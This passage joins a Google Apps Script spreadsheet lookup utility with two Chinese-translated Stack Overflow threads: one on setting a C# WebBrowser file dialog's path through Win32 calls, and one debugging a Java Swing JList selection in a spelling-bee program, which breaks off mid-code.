//~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`
//--//Dependent on isEmpty_()
// Script Look-up
/*
Benefit of this script is:
-That google sheets will not continually do lookups on data that is not changing with using this function as it is set with hard values until script is kicked off again.
-Unlike Vlookup you can have it look at for reference data at any Column in the row.  Does not have to be in the first column for it to work like Vlookup.
-You can return the Lookup to Memory for further processing by other functions

Useage:

var LocNum    = SpreadsheetApp.openById(SheetID).getSheetByName('Sheet1').getRange('J2:J').getValues();

Lookup_(Sheetinfo,"Sheet1!A:B",0,[1],"Sheet1!I1","n","y");
//or
Lookup_(Sheetinfo,"Sheet1!A:B",0,[1],"return","n","n");
//or
Lookup_(Sheetinfo,"Sheet1!A:B",0,[0,1],"return","n","n");
//or
Lookup_(Sheetinfo,"Sheet1!A:B",1,[0],"return","y","n");
//or
Lookup_(Sheetinfo,"Sheet1!A:G",4,[0],"Database!A1","y","y");
*/

function Lookup_(Search_Key,RefSheetRange,SearchKey_Ref_IndexOffSet,IndexOffSetForReturn,SetSheetRange,ReturnMultiResults,Add_Note)   
{
  var RefSheetRange = RefSheetRange.split("!");
  var Ref_Sheet = RefSheetRange[0];
  var Ref_Range = RefSheetRange[1];

  if(!/return/i.test(SetSheetRange))
  {
  var SetSheetRange = SetSheetRange.split("!");
  var Set_Sheet = SetSheetRange[0];
  var Set_Range = SetSheetRange[1];
  var RowVal = SpreadsheetApp.getActive().getSheetByName(Set_Sheet).getRange(Set_Range).getRow();
  var ColVal = SpreadsheetApp.getActive().getSheetByName(Set_Sheet).getRange(Set_Range).getColumn();
  }

  var twoDimensionalArray = [];
  var data = SpreadsheetApp.getActive().getSheetByName(Ref_Sheet).getRange(Ref_Range).getValues();         //Syncs sheet by name and range into var
  for (var i = 0, Il=Search_Key.length; i<Il; i++)                                                         // i = number of rows to index and search  
  {
    var Sending = [];                                                                                      //Making a Blank Array
    var newArray = [];                                                                                     //Making a Blank Array
    var Found ="";
    for (var nn=0, NNL=data.length; nn<NNL; nn++)                                                                 //nn = will be the number of row that the data is found at
    {
      if(Found==1 && ReturnMultiResults.toUpperCase() == 'N')                                                                                         //if statement for found if found = 1 it will to stop all other logic in nn loop from running
      {
        break;                                                                                             //Breaking nn loop once found
      }
      if (data[nn][SearchKey_Ref_IndexOffSet]==Search_Key[i])                                              //if statement is triggered when the search_key is found.
      {
        var newArray = [];
        for (var cc=0, CCL=IndexOffSetForReturn.length; cc<CCL; cc++)                                         //cc = numbers of columns to referance
        {
          var iosr = IndexOffSetForReturn[cc];                                                             //Loading the value of current cc
          var Sending = data[nn][iosr];                                                                    //Loading data of Level nn offset by value of cc
          if(isEmpty_(Sending))                                                                      //if statement for if one of the returned Column level cells are blank
          {
          var Sending =  "#N/A";                                                                           //Sets #N/A on all column levels that are blank
          }
          if (CCL>1)                                                                                       //if statement for multi-Column returns
          {
            newArray.push(Sending);
            if(CCL-1 == cc)                                                                                //if statement for pulling all columns into larger array
            {
              twoDimensionalArray.push(newArray);
              var Found = 1;                                                                              //Modifying found to 1 if found to stop all other logic in nn loop
              break;                                                                                      //Breaking cc loop once found
            }
          }
          else if (CCL<=1)                                                                                 //if statement for single-Column returns
          {
            twoDimensionalArray.push(Sending);
            var Found = 1;                                                                                 //Modifying found to 1 if found to stop all other logic in nn loop
            break;                                                                                         //Breaking cc loop once found
          }
        }
      }
      if(NNL-1==nn && isEmpty_(Sending))                                                             //following if statement is for if the current item in lookup array is not found.  Nessessary for data structure.
      {
        for(var na=0,NAL=IndexOffSetForReturn.length;na<NAL;na++)                                          //looping for the number of columns to place "#N/A" in to preserve data structure
        {
          if (NAL<=1)                                                                                      //checks to see if it's a single column return
          {
            var Sending = "#N/A";
            twoDimensionalArray.push(Sending);
          }
          else if (NAL>1)                                                                                  //checks to see if it's a Multi column return
          {
            var Sending = "#N/A";
            newArray.push(Sending);
          }
        }
        if (NAL>1)                                                                                         //checks to see if it's a Multi column return
        {
          twoDimensionalArray.push(newArray);  
        }
      }
    }
  }
  if (CCL<=1)                                                                                            //checks to see if it's a single column return for running setValue
  {
    var singleArrayForm = [];
    for (var l = 0,lL=twoDimensionalArray.length; l<lL; l++)                                                          //Builds 2d Looping-Array to allow choosing of columns at a future point
    {
      singleArrayForm.push([twoDimensionalArray[l]]);
    }
    if(!/return/i.test(SetSheetRange))
    {
      SpreadsheetApp.getActive().getSheetByName(Set_Sheet).getRange(RowVal,ColVal,singleArrayForm.length,singleArrayForm[0].length).setValues(singleArrayForm);
      SpreadsheetApp.flush();
      if(/y/i.test(Add_Note))
      {
        SpreadsheetApp.getActive().getSheetByName(Set_Sheet).getRange(RowVal,ColVal,1,1).setNote("VLookup Script Ran On: " + Utilities.formatDate(new Date(), "PST", "MM-dd-yyyy hh:mm a") + "\nRange: " + Ref_Sheet + "!" + Ref_Range);      
      }
    }
    else
    {
      return singleArrayForm
    }
  }
  if (CCL>1)                                                                                             //checks to see if it's a multi column return for running setValues
  {
    if(!/return/i.test(SetSheetRange))
    {
      SpreadsheetApp.getActive().getSheetByName(Set_Sheet).getRange(RowVal,ColVal,twoDimensionalArray.length,twoDimensionalArray[0].length).setValues(twoDimensionalArray);
      SpreadsheetApp.flush();
      if(/y/i.test(Add_Note))
      {
        SpreadsheetApp.getActive().getSheetByName(Set_Sheet).getRange(RowVal,ColVal,1,1).setNote("VLookup Script Ran On: " + Utilities.formatDate(new Date(), "PST", "MM-dd-yyyy hh:mm a") + "\nRange: " + Ref_Sheet + "!" + Ref_Range);      
      }
    }
    else
    {
      return twoDimensionalArray
    }
  }

}
//~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`
//~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`
// Empty String Check
function isEmpty_(string) 
{
  if(Object.prototype.toString.call(string) == '[object Boolean]') return false;

  if(!string)             return true;         
  if(string == '')        return true;
  if(string === false)    return true; 
  if(string === null)     return true; 
  if(string == undefined) return true;
  string = string+' '; // check for a bunch of whitespace
  if('' == (string.replace(/^\s\s*/, '').replace(/\s\s*$/, ''))) return true;       

  return false;        
}
//~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~`~,~` 
```

# c# - C# web 浏览器和访问打开的文件opendialog

> ID：11243362
> 
> 赞同：1
> 
> 时间：2012-06-28T11:11:10.907
> 
> 标签：c#, browser, filedialog

我开发了一个程序，它有一个网络浏览器。

我想设置打开的文件对话框的默认路径（初始目录）。[如何访问由 WebBrowser 控件打开的文件浏览器]

以及如何由我自动设置文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T12:11:50.033

您可以使用 Windows API (user32.dll) 更改目录对话框。例如：获取 FileDialog 窗口的处理程序

```
[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

private const int WM_SETTEXT = 0x000C;

IntPtr FileDialogHandle = FindWindow("#32770", "Choose File To Upload"); 
```

获取 FileDialog 窗口的处理程序文本框文件地址和发送路径：

```
IntPtr iptrHWndControl = GetDlgItem(FileDialogHandle , 1148);
HandleRef hrefHWndTarget = new HandleRef(null, iptrHWndControl);
SendMessage(hrefHWndTarget, WM_SETTEXT, IntPtr.Zero, "your file path"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:16:48.200

无法设置默认路径。

# java - jlist 获取和设置选择损坏？

> ID：11243366
> 
> 赞同：0
> 
> 时间：2012-06-28T11:11:27.407
> 
> 标签：java, swing, selection, jlist

程序应该做什么：

在用户单击“删除”按钮并从单词管理器 gui 窗口的列表中选择一个单词后，应该选择单词列表中的另一个项目（任何项目）（在 gui 上突出显示），这样用户就没有来回单击以从列表中删除一系列单词。

我向您推荐以下代码片段以进一步说明问题：

```
logic.words.remove(w);
logic.save_words_to_disk();
populate_list();
word_list.setSelectedIndex(0); //doesn't make the selection in the list 
```

上面的代码片段可用于在浏览器中运行“查找”搜索，以找到我所指的代码部分。另外，为了说明我的意思，列表应该预先填充一些项目（在测试时显然不会使用空列表）。

发生什么了：

选定的单词被删除，但显然，方法调用 word_list.setSelectedIndex(...) 没有任何效果，因为在调用它之后没有选择任何内容。getSelectedIndex() 方法也不起作用，但我使用了一种变通方法（列表选择侦听器）来获取列表中当前选定的索引，但它很难看（不优雅）。

我的问题：

我究竟做错了什么？我在一个简单的程序中尝试了设置列表选择方法，它工作正常，但由于某种原因，它在我的主项目中不起作用。我已经发布了我的主项目和下面的简单测试项目的完整源代码。

任何帮助，将不胜感激。谢谢！

---主要项目---

```
package spellingbee;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.*;
import java.util.ArrayList;
import java.util.Random;
import javax.sound.sampled.*;
import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

public class SpellingBee {

    public static void main(String[] args) {
        //create objects
        GUI gui = new GUI();
        Logic logic = new Logic();

        //link objects
        gui.logic = logic;
        logic.gui = gui;
        AudioRecorder.logic = logic;

        //start program
        AudioRecorder.init();
        gui.initialize();

        logic.load_words_from_disk();
        logic.choose_word();
        logic.prompt_word();
    }
}

class GUI {

    //this link is set externally
    public Logic logic = null;
    public WordManager word_manager = null;
    public MainGUI main_gui = null;

    public void initialize() {

        main_gui = new MainGUI();
        word_manager = new WordManager();

    }

    public void show_word_manager() {
        word_manager.populate_list();
        word_manager.window.setLocationRelativeTo(main_gui.window);
        word_manager.window.setVisible(true);
    }

    class MainGUI {

        public JLabel input_label = null;
        public JLabel last_word_label = null;
        JFrame window = null;

        public MainGUI() {
            window = new JFrame("Spelling Bee");
            window.addKeyListener(new Keyboard());
            window.setLayout(new BorderLayout());

            input_label = new JLabel("", JLabel.CENTER);
            input_label.setFont(new Font("", Font.PLAIN, 32));
            input_label.setFocusable(false);
            input_label.setPreferredSize(new Dimension(400, 100));

            last_word_label = new JLabel("", JLabel.CENTER);
            last_word_label.setFont(new Font("", Font.ITALIC, 16));
            last_word_label.setFocusable(false);
            last_word_label.setPreferredSize(new Dimension(400, 30));

            JLabel help_label_1 = new JLabel("Press '0' to hear the current word.", JLabel.CENTER);
            JLabel help_label_2 = new JLabel("Press '1' to manage word list.", JLabel.CENTER);

            JPanel help_panel = new JPanel(new GridLayout(2, 1));
            help_panel.add(help_label_1);
            help_panel.add(help_label_2);

            window.getContentPane().add(input_label, BorderLayout.CENTER);
            window.getContentPane().add(last_word_label, BorderLayout.NORTH);
            window.getContentPane().add(help_panel, BorderLayout.SOUTH);

            window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            window.pack();
            window.setLocationRelativeTo(null);
            window.setVisible(true);
        }
    }

    class WordManager {

        public JDialog window = null;
        public JList word_list = null;
        public DefaultListModel list_model = null;
        public JButton delete_button = null;
        public JButton record_button = null;
        public int list_selection;
        public JTextField input_field = null;

        public WordManager() {

            window = new JDialog(main_gui.window, "Word Viewer", true);
            //window.setPreferredSize(new Dimension(300, 300));

            list_model = new DefaultListModel();
            DefaultListSelectionModel dlsm = new DefaultListSelectionModel();
            dlsm.clearSelection();
            word_list = new JList(list_model);
            word_list.setSelectionModel(dlsm);
            word_list.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            word_list.addListSelectionListener(new SelectionManager());

            JScrollPane word_list_scroll_pane = new JScrollPane(word_list);
            word_list_scroll_pane.setPreferredSize(new Dimension(150, 300));

            ButtonManager button_manager = new ButtonManager();

            delete_button = new JButton("Delete");
            delete_button.setActionCommand("delete_button");
            delete_button.addActionListener(button_manager);
            //delete_button.setPreferredSize(new Dimension(100,30));

            record_button = new JButton("Record");
            record_button.setActionCommand("start_record");
            record_button.addActionListener(button_manager);

            input_field = new JTextField(15);

            JPanel record_panel = new JPanel(new GridLayout(2, 1));
            record_panel.add(input_field);
            record_panel.add(record_button);

            JPanel east_panel = new JPanel(new BorderLayout());
            east_panel.add(delete_button, BorderLayout.SOUTH);
            east_panel.add(record_panel, BorderLayout.NORTH);

            window.setLayout(new BorderLayout());
            window.add(word_list_scroll_pane, BorderLayout.WEST);
            window.add(east_panel, BorderLayout.EAST);

            window.setDefaultCloseOperation(JDialog.HIDE_ON_CLOSE);
            window.pack();
            window.setLocationRelativeTo(main_gui.window);

        }

        public void populate_list() {

            //this code creates a thread on the event dispatch thread
            //which is needed for gui actions. not doing this for gui
            //operations can cause unpredictable errors that are
            //difficult to reproduce
            EventQueue.invokeLater(new Runnable() {

                @Override
                public void run() {
                    populate_list_helper();
                }
            });
        }

        private void populate_list_helper() {
            //this line will determine whether or not a block of code is running
            //on the event dispatching thread
            //System.out.println(javax.swing.SwingUtilities.isEventDispatchThread());

            list_model.clear();

            for (Word w : logic.words) {
                list_model.addElement(w.spelling);
            }
        }

        class SelectionManager implements ListSelectionListener {

            @Override
            public void valueChanged(ListSelectionEvent e) {
                list_selection = e.getFirstIndex();
            }
        }

        class ButtonManager implements ActionListener {

            @Override
            public void actionPerformed(ActionEvent e) {
                String action_command = e.getActionCommand();
                if (action_command.equals("delete_button")) {
                    int selection = list_selection;
                    if (selection != -1) {
                        String selected_string = word_list.getModel().getElementAt(selection).toString();

                        for (Word w : logic.words) {
                            if (w.spelling.equals(selected_string)) {
                                logic.words.remove(w);
                                logic.save_words_to_disk();
                                populate_list();
                                word_list.setSelectedIndex(0);

                                return;
                            }
                        }
                    }
                } else if (action_command.equals("start_record")) {
                    if (!input_field.getText().isEmpty()) {
                        record_button.setActionCommand("stop_record");
                        record_button.setText("Stop Recording");
                        logic.start_recording();
                    } else {
                        SoundPlayer.play("wrong.wav");
                    }
                } else if (action_command.equals("stop_record")) {
                    record_button.setActionCommand("start_record");
                    logic.stop_recording();
                    record_button.setText("Record");
                    input_field.grabFocus();
                    input_field.selectAll();
                }
            }
        }
    }

    class Keyboard extends KeyAdapter {

        @Override
        public void keyTyped(KeyEvent e) {
            logic.process_keyboard_input(e);
        }
    }
}

class Logic {

    public GUI gui = null;
    ArrayList<Word> words = new ArrayList<Word>();
    Word current_word = null;
    //public byte[] sound_data = null;

    public void save_words_to_disk() {
        try {
            FileOutputStream fos = new FileOutputStream("src\\spellingbee\\words.dat");
            ObjectOutputStream oos = new ObjectOutputStream(fos);

            oos.writeObject(words);

            oos.close();
        } catch (Exception e) {
            System.err.println("save_words_to_disk: " + e);
        }

    }

    public void load_words_from_disk() {
        try {
            FileInputStream fis = new FileInputStream("src\\spellingbee\\words.dat");
            ObjectInputStream ois = new ObjectInputStream(fis);

            words = (ArrayList<Word>) ois.readObject();

            ois.close();
        } catch (Exception e) {
            System.err.println("load_words_from_disk: " + e);
        }
    }

    public void start_recording() {
        AudioRecorder.captureAudio();
    }

    public void stop_recording() {
        AudioRecorder.stopCapture = true;
    }

    public void process_new_word(byte[] sound_data) {
        Word temp_word = new Word(gui.word_manager.input_field.getText(), sound_data);
        words.add(temp_word);
        temp_word.play();

        if (words.size() == 1) {
            choose_word();
        }

        gui.word_manager.populate_list();
        save_words_to_disk();
    }

    public void choose_word() {
        if (current_word != null) {
            String old_word = current_word.spelling;

            if (words.size() > 1) {
                while (old_word.equals(current_word.spelling)) {
                    current_word = words.get(new Random().nextInt(words.size()));
                }
            } else {
                current_word = words.get(0);
            }
        } else {
            if (words.size() > 0) {
                current_word = words.get(new Random().nextInt(words.size()));
            }

        }
    }

    public void prompt_word() {
        if (current_word != null) {
            current_word.play();
        }
    }

    public void process_keyboard_input(KeyEvent e) {
        char user_input = e.getKeyChar();

        //verify input
        if (!input_ok(user_input)) {
            return;
        }

        switch (user_input) {
            case '0':
                prompt_word();
                return;
            case '1':
                gui.show_word_manager();
                return;
            default:
                break;
        }

        String result_string = gui.main_gui.input_label.getText();

        gui.main_gui.input_label.setText(result_string + Character.toString(user_input));

        result_string = gui.main_gui.input_label.getText();

        String answer_string = current_word.spelling;

        if (result_string.equalsIgnoreCase(answer_string)) {
            SoundPlayer.play("ding.wav");
            gui.main_gui.last_word_label.setText(gui.main_gui.input_label.getText().toLowerCase());
            gui.main_gui.input_label.setText("");
            choose_word();
            prompt_word();
        }

        //check to see if input is correct so far
        int result_length = result_string.length();
        String partial_result = result_string.substring(0, result_length);
        String partial_answer = answer_string.substring(0, result_length);
        if (!partial_result.equalsIgnoreCase(partial_answer)) {
            SoundPlayer.play("wrong.wav");
            gui.main_gui.input_label.setText("");
        }

    }

    public boolean input_ok(char input_value) {
        boolean result = false;

        switch (new Character(input_value).toString().toLowerCase().charAt(0)) {
            case 'a':
            case 'b':
            case 'c':
            case 'd':
            case 'e':
            case 'f':
            case 'g':
            case 'h':
            case 'i':
            case 'j':
            case 'k':
            case 'l':
            case 'm':
            case 'n':
            case 'o':
            case 'p':
            case 'q':
            case 'r':
            case 's':
            case 't':
            case 'u':
            case 'v':
            case 'w':
            case 'x':
            case 'y':
            case 'z':
            case '0':
            case '1':
                result = true;
        }

        return result;
    }
}

class Word implements Serializable {

    public String spelling = null;
    public byte[] audio_data = null;

    public Word(String spelling, byte[] audio_data) {
        this.spelling = spelling;
        this.audio_data = audio_data;
        System.out.println("");
    }

    public void play() {
        SoundPlayer.play_data(audio_data);
    }
}

class SoundPlayer {

    static AudioFormat audio_format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100.0F, 16, 2, 4, 44100.0F, false);

    static public void play(String path) {
        try {
            Clip clip = AudioSystem.getClip();

            InputStream audio_src = SpellingBee.class.getResourceAsStream(path);
            InputStream buffered_in = new BufferedInputStream(audio_src);
            AudioInputStream audioStream = AudioSystem.getAudioInputStream(buffered_in);

            clip.open(audioStream);
            clip.start();
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }

    static public void play_data(byte[] data) {
        Clip clip = null;
        try {
            clip = AudioSystem.getClip();
        } catch (Exception e) {
            System.err.println("1 " + e.getMessage());
        }

        try {

            clip.open(audio_format, data, 0, data.length);

        } catch (LineUnavailableException e) {
            System.err.println("2a " + e.getMessage());
        } catch (IllegalArgumentException e) {
            System.err.println("2b " + e.getMessage());
        } catch (IllegalStateException e) {
            System.err.println("2c " + e.getMessage());
        } catch (SecurityException e) {
            System.err.println("2d " + e.getMessage());
        }

        try {
            clip.start();
        } catch (Exception e) {
            System.err.println("3 " + e.getMessage());
        }

    }
}

class AudioRecorder {

    static boolean stopCapture = false;
    static ByteArrayOutputStream byteArrayOutputStream;
    static AudioFormat audioFormat = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100.0F, 16, 2, 4, 44100.0F, false);
    static TargetDataLine targetDataLine;
    static private byte[] audioData = null;
    public static Logic logic = null;

    static public byte[] get_audio_data() {
        return audioData;
    }

    static public void init() {
        try {
            DataLine.Info dataLineInfo = new DataLine.Info(TargetDataLine.class, audioFormat);
            targetDataLine = (TargetDataLine) AudioSystem.getLine(dataLineInfo);
            targetDataLine.open(audioFormat);
        } catch (Exception e) {
            System.err.println(e);
        }
    }

    static public void captureAudio() {
        try {
            targetDataLine.start();
            //Create a thread to capture the microphone data and start it
            //running. It will run until the Stop button is clicked.
            Thread captureThread = new Thread(new CaptureThread());
            captureThread.start();
        } catch (Exception e) {
            System.out.println("4 " + e);
            System.exit(0);
        }//end catch
    }//end captureAudio method

    static class CaptureThread extends Thread {
        //An arbitrary-size temporary holding buffer

        byte tempBuffer[] = new byte[10000];

        @Override
        public void run() {
            byteArrayOutputStream = new ByteArrayOutputStream();
            stopCapture = false;
            try {
                //stopCapture will be set by another thread
                while (!stopCapture) {
                    //Read data from the internal buffer of the data line.
                    int cnt = targetDataLine.read(tempBuffer, 0, tempBuffer.length);
                    if (cnt > 0) {
                        byteArrayOutputStream.write(tempBuffer, 0, cnt);
                    }
                }

                byteArrayOutputStream.close();
                audioData = byteArrayOutputStream.toByteArray();
                logic.process_new_word(audioData);
                System.out.println();

            } catch (Exception e) {
                System.out.println("capture thread " + e);
                System.exit(0);
            }//end catch
        }//end run
    }//end inner class CaptureThread
}//end outer class AudioCapture01.java 
```

---测试项目---

```
package testing;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Random;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JList;

public class Testing {

    public static void main(String[] args) {
        JFrame frame = new JFrame();
        String[] items = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"};
        final JList list = new JList(items);
        list.setPreferredSize(new Dimension(200,200));
        frame.setLayout(new BorderLayout());

        JButton button = new JButton("select random item");
        button.addActionListener(new ActionListener()
        {
            @Override
            public void actionPerformed(ActionEvent e) {
                list.setSelectedIndex(new Random().nextInt(11));
            }
        }
        );

        frame.getContentPane().add(list, BorderLayout.CENTER);
        frame.getContentPane().add(button, BorderLayout.EAST);

        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:27:12.253

您的代码不起作用的原因实际上很简单：

1.  用户按下删除
2.  您从“模型”中删除所选单词
3.  你调用`populate_list()`你调用的地方`invokeLater`，稍后调用`populate_list_helper()`
4.  您选择索引 0
5.  `populate_list_helper()`被调用
6.  您清除列表，这也会重置选择
7.  你重建列表，但你没有设置回选择

问题：

为什么在 EDT 上使用 invokeLater （`ActionEvent`仅在 EDT 上发生，这就是 EDT 的重点）？（记住 EDT 代表 Event Dispatching Thread）

您在这里有几个选择：

1.  直接`populate_list_helper()`调用而不是调用它`invokeLater`
2.  在`populate_list_helper()`重新填充列表后恢复以前的选择。

注意：有什么理由阻止多重选择？这对最终用户来说会友好得多。他可以在一个动作中删除几个单词。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T20:22:54.793

这是实现我的问题解决方案的更新代码。

```
package spellingbee;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.*;
import java.util.ArrayList;
import java.util.Random;
import javax.sound.sampled.*;
import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

public class SpellingBee {

    public static void main(String[] args) {
        //create objects
        GUI gui = new GUI();
        Logic logic = new Logic();

        //link objects
        gui.logic = logic;
        logic.gui = gui;
        AudioRecorder.logic = logic;

        //start program
        AudioRecorder.init();
        gui.initialize();

        logic.load_words_from_disk();
        logic.choose_word();
        logic.prompt_word();
    }
}

class GUI {

    //this link is set externally
    public Logic logic = null;
    public WordManager word_manager = null;
    public MainGUI main_gui = null;

    public void initialize() {

        main_gui = new MainGUI();
        word_manager = new WordManager();

    }

    public void show_word_manager() {
        word_manager.populate_list_on_new_thread();
        word_manager.window.setLocationRelativeTo(main_gui.window);
        word_manager.window.setVisible(true);
    }

    class MainGUI {

        public JLabel input_label = null;
        public JLabel last_word_label = null;
        JFrame window = null;

        public MainGUI() {
            window = new JFrame("Spelling Bee");
            window.addKeyListener(new Keyboard());
            window.setLayout(new BorderLayout());

            input_label = new JLabel("", JLabel.CENTER);
            input_label.setFont(new Font("", Font.PLAIN, 32));
            input_label.setFocusable(false);
            input_label.setPreferredSize(new Dimension(400, 100));

            last_word_label = new JLabel("", JLabel.CENTER);
            last_word_label.setFont(new Font("", Font.ITALIC, 16));
            last_word_label.setFocusable(false);
            last_word_label.setPreferredSize(new Dimension(400, 30));

            JLabel help_label_1 = new JLabel("Press '0' to hear the current word.", JLabel.CENTER);
            JLabel help_label_2 = new JLabel("Press '1' to manage word list.", JLabel.CENTER);

            JPanel help_panel = new JPanel(new GridLayout(2, 1));
            help_panel.add(help_label_1);
            help_panel.add(help_label_2);

            window.getContentPane().add(input_label, BorderLayout.CENTER);
            window.getContentPane().add(last_word_label, BorderLayout.NORTH);
            window.getContentPane().add(help_panel, BorderLayout.SOUTH);

            window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            window.pack();
            window.setLocationRelativeTo(null);
            window.setVisible(true);
        }
    }

    class WordManager {

        public JDialog window = null;
        public JList word_list = null;
        public DefaultListModel list_model = null;
        public JButton delete_button = null;
        public JButton record_button = null;
        public int list_selection;
        public JTextField input_field = null;

        public WordManager() {

            window = new JDialog(main_gui.window, "Word Viewer", true);
            //window.setPreferredSize(new Dimension(300, 300));

            list_model = new DefaultListModel();
            DefaultListSelectionModel dlsm = new DefaultListSelectionModel();
            dlsm.clearSelection();
            word_list = new JList(list_model);
            word_list.setSelectionModel(dlsm);
            word_list.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            word_list.addListSelectionListener(new SelectionManager());

            JScrollPane word_list_scroll_pane = new JScrollPane(word_list);
            word_list_scroll_pane.setPreferredSize(new Dimension(150, 300));

            ButtonManager button_manager = new ButtonManager();

            delete_button = new JButton("Delete");
            delete_button.setActionCommand("delete_button");
            delete_button.addActionListener(button_manager);
            //delete_button.setPreferredSize(new Dimension(100,30));

            record_button = new JButton("Record");
            record_button.setActionCommand("start_record");
            record_button.addActionListener(button_manager);

            input_field = new JTextField(15);

            JPanel record_panel = new JPanel(new GridLayout(2, 1));
            record_panel.add(input_field);
            record_panel.add(record_button);

            JPanel east_panel = new JPanel(new BorderLayout());
            east_panel.add(delete_button, BorderLayout.SOUTH);
            east_panel.add(record_panel, BorderLayout.NORTH);

            window.setLayout(new BorderLayout());
            window.add(word_list_scroll_pane, BorderLayout.WEST);
            window.add(east_panel, BorderLayout.EAST);

            window.setDefaultCloseOperation(JDialog.HIDE_ON_CLOSE);
            window.pack();
            window.setLocationRelativeTo(main_gui.window);

        }

        //CODE REVISIONS START HERE*********************************
        //(see code within ButtonManager below for additional changes)

        public void populate_list_on_new_thread() {

            //this code creates a thread on the event dispatch thread
            //which is needed for gui actions. not doing this for gui
            //operations can cause unpredictable errors that are
            //difficult to reproduce
            EventQueue.invokeLater(new Runnable() {

                @Override
                public void run() {
                    populate_list();
                }
            });
        }

        //this method populates the list without creating a new thread
        public void populate_list() {
            //this line will determine whether or not a block of code is running
            //on the event dispatching thread
            //System.out.println(javax.swing.SwingUtilities.isEventDispatchThread());

            list_model.clear();

            for (Word w : logic.words) {
                list_model.addElement(w.spelling);
            }
        }

        //CODE REVISIONS END HERE*********************************

        class SelectionManager implements ListSelectionListener {

            @Override
            public void valueChanged(ListSelectionEvent e) {
                list_selection = e.getFirstIndex();
            }
        }

        class ButtonManager implements ActionListener {

            @Override
            public void actionPerformed(ActionEvent e) {
                String action_command = e.getActionCommand();
                if (action_command.equals("delete_button")) {
                    int selection = list_selection;
                    if (selection != -1) {
                        String selected_string = word_list.getModel().getElementAt(selection).toString();

                        for (Word w : logic.words) {
                            if (w.spelling.equals(selected_string)) {
                                logic.words.remove(w);
                                logic.save_words_to_disk();

                                //CODE REVISIONS START HERE*********************************
                                //(see populate_list() and populate_list_on_new_thread() definitions above for additional changes

                                populate_list(); //doesn't invoke a new thread; should finish before selection is made, so as not to clear the selection once the list is repopulated

                                //this makes sure something is selected
                                if(selection >= word_list.getModel().getSize()) {
                                    selection = word_list.getModel().getSize() - 1;
                                }

                                word_list.setSelectedIndex(selection);

                                //CODE REVISIONS END HERE*********************************

                                return;
                            }
                        }
                    }
                } else if (action_command.equals("start_record")) {
                    if (!input_field.getText().isEmpty()) {
                        record_button.setActionCommand("stop_record");
                        record_button.setText("Stop Recording");
                        logic.start_recording();
                    } else {
                        SoundPlayer.play("wrong.wav");
                    }
                } else if (action_command.equals("stop_record")) {
                    record_button.setActionCommand("start_record");
                    logic.stop_recording();
                    record_button.setText("Record");
                    input_field.grabFocus();
                    input_field.selectAll();
                }
            }
        }
    }

    class Keyboard extends KeyAdapter {

        @Override
        public void keyTyped(KeyEvent e) {
            logic.process_keyboard_input(e);
        }
    }
}

class Logic {

    public GUI gui = null;
    ArrayList<Word> words = new ArrayList<Word>();
    Word current_word = null;
    //public byte[] sound_data = null;

    public void save_words_to_disk() {
        try {
            FileOutputStream fos = new FileOutputStream("src\\spellingbee\\words.dat");
            ObjectOutputStream oos = new ObjectOutputStream(fos);

            oos.writeObject(words);

            oos.close();
        } catch (Exception e) {
            System.err.println("save_words_to_disk: " + e);
        }

    }

    public void load_words_from_disk() {
        try {
            FileInputStream fis = new FileInputStream("src\\spellingbee\\words.dat");
            ObjectInputStream ois = new ObjectInputStream(fis);

            words = (ArrayList<Word>) ois.readObject();

            ois.close();
        } catch (Exception e) {
            System.err.println("load_words_from_disk: " + e);
        }
    }

    public void start_recording() {
        AudioRecorder.captureAudio();
    }

    public void stop_recording() {
        AudioRecorder.stopCapture = true;
    }

    public void process_new_word(byte[] sound_data) {
